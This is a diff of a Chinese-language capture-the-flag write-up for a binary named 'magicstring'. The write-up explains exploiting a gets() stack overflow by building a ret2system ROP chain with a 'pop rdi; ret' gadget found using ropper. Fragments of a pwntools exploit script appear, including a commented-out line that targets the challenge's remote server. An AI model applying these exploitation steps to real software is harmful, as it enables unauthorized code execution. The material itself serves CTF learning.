@@ -11,11 +11,11 @@ categories: pwn gets system stackoverflow
 
 ![docs](/note/assets/magicstring-asm.png)  
 
-看汇编代码可以发现，64位程序，调用了system和gets函数，这里gets函数是可以直接溢出的。程序开始抬高了栈0x2a0个字节，main函数栈帧为672字节。然后程序保护项只开了NX保护，意味着不能不能通过栈去ret2shellcode。  
+看汇编代码可以发现，64位程序，调用了system和gets函数，这里gets函数是可以直接溢出的。程序开始抬高了栈0x2a0个字节，main函数栈帧为672字节。然后程序保护项只开了NX保护，意味着不能通过栈去ret2shellcode。  
 这里有了溢出点和system函数，最重要的两个因素。 但是还差一个shell和一个可控的参数传递。  
-众所周知，64位程序传参需要用到寄存器，依次是rdi、rsi、rdx、rcx、r8、r9，而32位直接通过栈就可以了，所以需要找到可控的rdi寄存器
+众所周知，64位程序传参需要用到寄存器，依次是rdi、rsi、rdx、rcx、r8、r9，而32位直接通过栈就可以了，所以需要找到可控的rdi寄存器。   
 这里开始构造ROP链，推荐一款工具叫 `ropper`，跟ROPGadget差不多，但是总感觉ropper更好用。  
-找一下rip和sh：
+找一下rdi和sh：
 ```bash
 $ ropper  --file magicstring --search 'pop rdi|ret'
 [INFO] Load gadgets from cache
@@ -94,6 +94,7 @@ system = p64(0x4004f0)
 main = p64(0x400661)
 rbp = p64(0x7fffffffe040)
 
+#p = remote('111.231.70.44', 28042)
 p = process('magicstring')
 print(p.recv())
 elf = ELF('magicstring')
